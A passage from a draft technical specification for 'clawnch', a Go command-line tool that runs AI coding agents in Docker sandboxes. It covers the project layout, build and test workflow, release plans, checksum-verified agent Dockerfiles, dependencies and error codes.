├── LICENSE                       # Apache 2.0
├── README.md
├── SPEC.md                       # This document
│
├── images/                       # Agent Dockerfiles
│   ├── opencode.Dockerfile
│   ├── claude.Dockerfile
│   └── codex.Dockerfile
│
├── clawnch/                      # Internal Go package
│   ├── cli.go                    #   Root cobra command
│   ├── run.go                    #   clawnch run
│   ├── setup.go                  #   clawnch setup
│   ├── list.go                   #   clawnch list
│   ├── stop.go                   #   clawnch stop
│   ├── logs.go                   #   clawnch logs
│   ├── network.go                #   clawnch network
│   ├── agents.go                 #   clawnch agents
│   ├── backend.go                #   Backend interface
│   ├── container.go              #   ContainerBackend implementation
│   ├── creds.go                  #   CredStore interface
│   ├── keychain.go               #   macOS Keychain implementation
│   ├── encfile.go                #   Encrypted file implementation
│   ├── agent.go                  #   Agent type + registry
│   ├── types.go                  #   Shared types (SandboxConfig, etc.)
│   ├── config.go                 #   Config loading (TOML)
│   ├── network.go                #   Network policy logic
│   ├── git.go                    #   Git branch mode logic
│   └── util.go                   #   Path resolution, helpers
│
├── clawnch_test/                 # Test data and integration tests
│   └── testdata/
│       └── config.toml
│
└── build/                        # Release artifacts (gitignored)
    ├── clawnch-darwin-arm64
    ├── clawnch-linux-arm64
    └── clawnch-linux-amd64
```

---

## 16. Development Workflow

### 16.1 Justfile Recipes

```just
NAME := "clawnch"

# Build development binary
build:
    go build -o {{NAME}} .

# Run with arguments
run *args:
    go run . {{args}}

# Run all tests
test:
    go test -v -race -count=1 ./...

# Run tests with coverage
test-cover:
    go test -v -race -count=1 -coverprofile=coverage.out ./...
    go tool cover -html=coverage.out

# Format code
fmt:
    go fmt ./...

# Lint (requires golangci-lint)
lint:
    golangci-lint run

# Build agent images
image-% agent:
    docker build -f images/{{agent}}.Dockerfile -t {{NAME}}/{{agent}} .

# Build all agent images
images:
    for f in images/*.Dockerfile; do \
        agent=$$(basename "$$f" .Dockerfile); \
        docker build -f "$$f" -t {{NAME}}/"$$agent" .; \
    done

# Cross-compile release binaries
release:
    mkdir -p build
    GOOS=darwin  GOARCH=arm64 go build -o build/{{NAME}}-darwin-arm64  .
    GOOS=linux   GOARCH=arm64 go build -o build/{{NAME}}-linux-arm64   .
    GOOS=linux   GOARCH=amd64 go build -o build/{{NAME}}-linux-amd64   .

# Clean build artifacts
clean:
    rm -rf {{NAME}} build/ coverage.out

.PHONY: build run test test-cover fmt lint images release clean
```

### 16.2 Go Toolchain Requirements

- Go 1.23+
- `golangci-lint` (optional, for linting)
- Docker Engine (for integration tests and image building)

---

## 17. Testing Strategy

### 17.1 Unit Tests

| Package | Tests | Coverage |
|---|---|---|
| `clawnch` | Config parsing, agent registry, path resolution, network policy validation, credential validation | All public functions |
| `clawnch` | `CredStore` in-memory mock | All operations |
| `clawnch` | `Backend` mock validation | Config → Docker args |

### 17.2 Integration Tests

| Test | What it validates |
|---|---|
| `TestContainerBackend_Run_WithMockDocker` | The Docker CLI command string generated from a `SandboxConfig` |
| `TestContainerBackend_List` | `docker ps --filter` invocation and output parsing |
| `TestKeychainCredStore` | `security` CLI invocation patterns |
| `TestAgentImageBuild` | `docker build` invoked with correct Dockerfile |

### 17.3 End-to-End Tests

E2E tests require a real Docker daemon and are only run in CI (not by default):

- Create sandbox → verify container is running → verify workspace is mounted → verify env vars are injected → stop sandbox → verify container is removed

### 17.4 CI Pipeline (Future)

```
make lint
make test
make test-cover
make build
make images
```

---

## 18. Release & Distribution

### 18.1 Artifacts

| Platform | Binary name |
|---|---|
| macOS arm64 | `clawnch-darwin-arm64` |
| macOS amd64 | `clawnch-darwin-amd64` |
| Linux arm64 | `clawnch-linux-arm64` |
| Linux amd64 | `clawnch-linux-amd64` |

### 18.2 Distribution Methods

1. **GitHub Releases** — Pre-built binaries attached to each release
2. **Homebrew** — Formula in a custom tap (future)
3. **`go install`** — `go install github.com/lucianmocan/clawnch@latest`

### 18.3 Versioning

Semantic versioning (`v0.1.0`, `v0.2.0`, `v1.0.0`, etc.) with git tags.

---

## 19. Future Work

### 19.1 Near-Term (Post-MVP)

| Feature | Priority | Description |
|---|---|---|
| MicroVM backend | High | Support microsandbox/Firecracker as an isolation backend |
| Linux Secret Service | High | `secret-tool` based credential store |
| Branch mode auto-commit | Medium | `--branch --commit` auto-stages and commits changes |
| Branch mode auto-PR | Medium | `--branch --pr` creates a GitHub PR with `gh` |
| User-defined agents | Medium | `~/.config/clawnch/agents.toml` for custom agents |
| Resource limits | Medium | `--memory`, `--cpus` flags for sandbox resource constraints |
| Respect system proxy | Low | `HTTP_PROXY` / `HTTPS_PROXY` passthrough for corporate environments |

### 19.2 Long-Term

| Feature | Description |
|---|---|
| TUI | Terminal UI with `bubbletea` for managing sandboxes interactively |
| Sandbox snapshots | Save/restore sandbox state for debugging |
| MCP integration | Mount MCP server sockets for tool execution sandboxing |
| Windows support | Windows Credential Manager + Docker Desktop |
| Image signing | cosign / sigstore verification of agent images |
| Plugin system | Go plugin or external process for custom backends, cred stores, agents |
| Remote sandboxes | Run sandboxes on a remote Docker host or Kubernetes pod |

---

## 20. Appendix A — Docker Image Definitions

### 20.1 `images/opencode.Dockerfile`

```dockerfile
# syntax=docker/dockerfile:1
FROM debian:stable-slim@sha256:5012d0517aa0075a7150a45aae67586641e898913b7af3b08228108565b5f90c AS downloader

RUN apt-get update && apt-get install -y \
    curl \
    ca-certificates \
    --no-install-recommends \
    && rm -rf /var/lib/apt/lists/*

ARG TARGETARCH
ARG OPENCODE_VERSION=v1.15.13
ARG OPENCODE_SHA256_ARM64=7a0e5da2427c7804314fe0f87b74b4408467f94e3b8b1a61ba25a1d71fe0b4d2
ARG OPENCODE_SHA256_AMD64=638838d7c6dfea1a017363063b7f2d421f0110687c4bb3c6e1f986a0ae1553a2

RUN set -eux; \
    case "${TARGETARCH}" in \
        arm64|aarch64) \
            BINARY="opencode-linux-arm64.tar.gz"; \
            EXPECTED_SHA256="${OPENCODE_SHA256_ARM64}" ;; \
        amd64|x86_64) \
            BINARY="opencode-linux-x64-baseline.tar.gz"; \
            EXPECTED_SHA256="${OPENCODE_SHA256_AMD64}" ;; \
        *) \
            case "$(uname -m)" in \
                aarch64|arm64) \
                    BINARY="opencode-linux-arm64.tar.gz"; \
                    EXPECTED_SHA256="${OPENCODE_SHA256_ARM64}" ;; \
                *) \
                    BINARY="opencode-linux-x64-baseline.tar.gz"; \
                    EXPECTED_SHA256="${OPENCODE_SHA256_AMD64}" ;; \
            esac ;; \
    esac; \
    curl -fsSL -o /tmp/opencode.tar.gz \
        "https://github.com/anomalyco/opencode/releases/download/${OPENCODE_VERSION}/${BINARY}"; \
    echo "${EXPECTED_SHA256}  /tmp/opencode.tar.gz" | sha256sum --check --strict -; \
    tar xz -C /usr/local/bin/ -f /tmp/opencode.tar.gz opencode; \
    rm -f /tmp/opencode.tar.gz

FROM debian:stable-slim@sha256:5012d0517aa0075a7150a45aae67586641e898913b7af3b08228108565b5f90c AS base

RUN apt-get update && apt-get install -y \
    git \
    ca-certificates \
    --no-install-recommends \
    && rm -rf /var/lib/apt/lists/*

COPY --from=downloader /usr/local/bin/opencode /usr/local/bin/opencode

ARG USER_ID=1000
RUN groupadd --system --gid ${USER_ID} agent \
    && useradd --system --uid ${USER_ID} --gid agent --create-home --home-dir /home/agent agent

USER agent
WORKDIR /workspace
```

### 20.2 `images/claude.Dockerfile`

```dockerfile
# syntax=docker/dockerfile:1
FROM debian:stable-slim@sha256:5012d0517aa0075a7150a45aae67586641e898913b7af3b08228108565b5f90c AS base

RUN apt-get update && apt-get install -y \
    git \
    curl \
    ca-certificates \
    npm \
    --no-install-recommends \
    && rm -rf /var/lib/apt/lists/*

RUN npm install -g @anthropic-ai/claude-code

ARG USER_ID=1000
RUN groupadd --system --gid ${USER_ID} agent \
    && useradd --system --uid ${USER_ID} --gid agent --create-home --home-dir /home/agent agent

USER agent
WORKDIR /workspace
```

### 20.3 `images/codex.Dockerfile`

```dockerfile
# syntax=docker/dockerfile:1
FROM debian:stable-slim@sha256:5012d0517aa0075a7150a45aae67586641e898913b7af3b08228108565b5f90c AS base

RUN apt-get update && apt-get install -y \
    git \
    curl \
    ca-certificates \
    npm \
    --no-install-recommends \
    && rm -rf /var/lib/apt/lists/*

RUN npm install -g @openai/codex

ARG USER_ID=1000
RUN groupadd --system --gid ${USER_ID} agent \
    && useradd --system --uid ${USER_ID} --gid agent --create-home --home-dir /home/agent agent

USER agent
WORKDIR /workspace
```

---

## 21. Appendix B — Go Module Dependencies

| Module | Version | Purpose |
|---|---|---|
| `github.com/spf13/cobra` | v1.9+ | CLI framework |
| `github.com/spf13/viper` | v1.19+ | Config file parsing |
| `github.com/BurntSushi/toml` | v1.4+ | TOML decoder for network/config files |
| `go.uber.org/zap` | v1.27+ | Structured logging |
| `github.com/fatih/color` | v1.18+ | Terminal color output |
| `github.com/mattn/go-isatty` | v0.20+ | TTY detection for color/format decisions |

Standard library only (no external dependencies):
- `os/exec` — Subprocess management (docker, security, git)
- `crypto/sha256` — Checksum verification
- `encoding/json` — Structured output
- `path/filepath` — Path resolution
- `os/user` — Home directory lookup

**Minimal dependency philosophy:**
Cobra + Viper are the standard Go CLI stack. Zap provides fast structured logging without reflection. Everything else is stdlib.

---

## 22. Appendix C — Error Codes

### 22.1 Error Types

```go
// SandboxError is the primary error type returned by all clawnch operations.
type SandboxError struct {
    Code    ErrorCode `json:"code"`
    Message string    `json:"message"`
    Detail  string    `json:"detail,omitempty"`
    Err     error     `json:"-"`  // Wrapped error (not serialized)
}

func (e *SandboxError) Error() string { ... }
func (e *SandboxError) Unwrap() error { return e.Err }

type ErrorCode int

const (
    // ─── General (1–99) ───
    ErrInternal         ErrorCode = 1   // Unexpected internal error
    ErrInvalidInput     ErrorCode = 2   // Bad CLI arguments or config
    ErrNotFound         ErrorCode = 3   // Resource not found (agent, sandbox, key)
    ErrAlreadyExists    ErrorCode = 4   // Resource already exists
    ErrPermission       ErrorCode = 5   // Permission denied
    ErrInterrupted      ErrorCode = 6   // User interrupted (SIGINT)

    // ─── Backend (100–199) ───
    ErrBackendUnavailable ErrorCode = 100 // Docker/microsandbox not installed or not running
    ErrImageNotFound      ErrorCode = 101 // Agent image not found and build failed
    ErrImageBuild         ErrorCode = 102 // Docker build failed
    ErrSandboxRun         ErrorCode = 103 // Container/VM failed to start
    ErrSandboxStop        ErrorCode = 104 // Failed to stop sandbox
    ErrSandboxLogs        ErrorCode = 105 // Failed to retrieve logs
    ErrSandboxList        ErrorCode = 106 // Failed to list sandboxes
    ErrNetworkCreate      ErrorCode = 107 // Failed to create Docker network
    ErrNetworkRule        ErrorCode = 108 // Invalid network rule

    // ─── Credential (200–299) ───
    ErrCredStoreUnavailable ErrorCode = 200 // Keychain/secret-service not available
    ErrCredNotFound         ErrorCode = 201 // Credential not found in store
    ErrCredSet              ErrorCode = 202 // Failed to store credential
    ErrCredDelete           ErrorCode = 203 // Failed to delete credential
    ErrCredList             ErrorCode = 204 // Failed to list credentials
    ErrCredDecrypt          ErrorCode = 205 // Failed to decrypt credential file (wrong password?)
    ErrCredEncrypt          ErrorCode = 206 // Failed to encrypt credential file

    // ─── Workspace (300–399) ───
    ErrWorkspaceNotFound    ErrorCode = 300 // Specified directory does not exist
    ErrWorkspaceNotDir      ErrorCode = 301 // Specified path is not a directory
    ErrWorkspaceUnsafe      ErrorCode = 302 // Path is unsafe (/, /etc, ~/.ssh, etc.)
    ErrWorkspaceNotGit      ErrorCode = 303 // Not a git repository (branch mode requires git)

    // ─── Git Branch Mode (400–499) ───
    ErrGitUnavailable       ErrorCode = 400 // Git not installed
    ErrGitDirty             ErrorCode = 401 // Uncommitted changes (branch mode requires clean tree)
    ErrGitBranch            ErrorCode = 402 // Failed to create branch
    ErrGitCommit            ErrorCode = 403 // Failed to commit changes
    ErrGitPR                ErrorCode = 404 // Failed to create pull request
)
```

### 22.2 Error Output Format

**Text (default):**

```
Error: sandbox not found
  Code: 3
  Detail: No sandbox with name "my-experiment" exists
```

**JSON (with `--log-format json`):**

```json
{
  "code": 3,
  "message": "sandbox not found",
  "detail": "No sandbox with name \"my-experiment\" exists"
}
```

---

*End of specification — clawnch v0.1.0-draft*
